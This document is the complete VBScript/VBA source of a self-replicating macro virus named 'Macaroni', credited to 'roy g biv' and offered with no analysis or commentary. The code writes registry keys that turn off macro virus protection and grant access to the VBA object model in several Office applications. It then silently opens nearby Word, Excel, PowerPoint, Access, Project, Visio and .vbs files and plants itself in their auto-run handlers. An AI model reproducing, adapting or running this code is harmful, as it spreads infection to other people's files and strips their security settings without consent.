'Macaroni - roy g biv 05/02/05
a=array("doc","xls","ppt","mdb","mpp","vsd","vbs")
b=array("Word","Excel","PowerPoint","Access","Project","Visio")
c=array("Document","WorkBook","p","d",b(4),"Document","Macaroni")
y="byval z as "
dim d(6)
d(4)=y+b(4)
d(5)=y+"iv"+c(0)
e = 6
f="This"+c(e)
g="m"
on error resume next
vbe.activevbproject.vbcomponents(f).export(g)
set h=activedocument
set h=activeworkbook
set h=activeproject
set h=activepresentation
h.vbproject.vbcomponents(f).export(g)
if e=6then g=wscript.scriptfullname
i="'"+c(6)
set j=createobject("scripting.filesystemobject")
k=j.opentextfile(g).readall
k=mid(k,instr(k,i))
k=left(k,instr(k,"'"+"'")+1)
if e<>6then j.getfile(g).delete
randomize
e=int(rnd*7)
f="This"+c(e)
g=instr(k,"e = ")
l=vbcrlf
g=l+left(k,g+3)+cstr(e)+mid(k,g+5)+l+"end "
set k=createobject("wscript.shell")
m="HKCU\software\microsoft\"
n=m+"office\8.0\"
o="REG_SZ"
k.regwrite n+"Word\Options\EnableMacroVirusProtection",0,o
k.regwrite n+"MS Project\Options\General\Macro Virus Protection","No",o
o="REG_DWORD"
k.regwrite n+"Excel\Microsoft Excel\Options6",0,o
k.regwrite n+"PowerPoint\Options\MacroVirusProtection",0,o
n=b(e)
if e=4then n="MS "+n
if e<>6then
for p=9 to 12
q=m
if e<>5then q=q+"Office\"+cstr(p)+".0\"
q=q+n+"\Security\"
k.regwrite q+"Level",1,o
k.regwrite q+"AccessVBOM",1,o
next
end if
set k=j.getfolder(".")
for each m in k.files
if lcase(j.getextensionname(m))=a(e)then
m=m.path
err=0
set o=j.opentextfile(m,8)
if err.number=0then
p="sub "
if e=6then
if instr(j.opentextfile(m).readall,i)=0then o.write l+c(6)+l+p+c(6)+g+p
else
err=0
if e=5then
set o=createobject(n+".invisibleapp")
else
if e=4then n="MS"+b(e)
set o=createobject(n+".application")
end if
if err.number=0then
o.visible=0
o.application.automationsecurity=1
set q=o.documents
set q=o.workbooks
set q=o.presentations
err=0
if e=3then
o.opencurrentdatabase(m)
else
if e=4then
o.fileopen(m)
set q=o.activeproject
else
if e=2then o.visible=1
set q=q.open(m)
end if
end if
if err.number=0then
set m=o.vbe.activevbproject.vbcomponents(f).codemodule
set m=q.vbproject.vbcomponents(f).codemodule
r="_open"
if e=5then r="_"+c(0)+"opened"
r=c(e)+r
err=0
m=m.proccountlines(q,0)
if err.number>0then
if e=2then q.vbproject.vbcomponents.add(1).name=f
if e=3then
with o.vbe.activevbproject
.vbcomponents.add(1).name=f
set m=.vbcomponents(f).codemodule
end with
end if
set m=q.vbproject.vbcomponents(f).codemodule
q="private "
if e=2or e=3then
q=""
if e=3then p="function "
end if
m.addfromstring(q+p+r+"("+d(e)+")"+g+p)
with o.activepresentation
with .slidemaster
set m=.shapes.addshape(1,0,0,.width,.height)
end with
m.fill.transparency=1
with m.actionsettings(1)
.action=8
.run=r
end with
.save
.close
end with
if e=3then
o.docmd.openform o.currentproject.allforms(0).name,1
o.forms(0).onopen="="+r+"()"
o.docmd.save 5,f
end if
o.activedocument.save
o.activeworkbook.save
o.filesave
o.fileclose
end if
end if
if e<>2and e<>4then o.quit
end if
end if
end if
end if
next
h.slideshowwindow.view.next''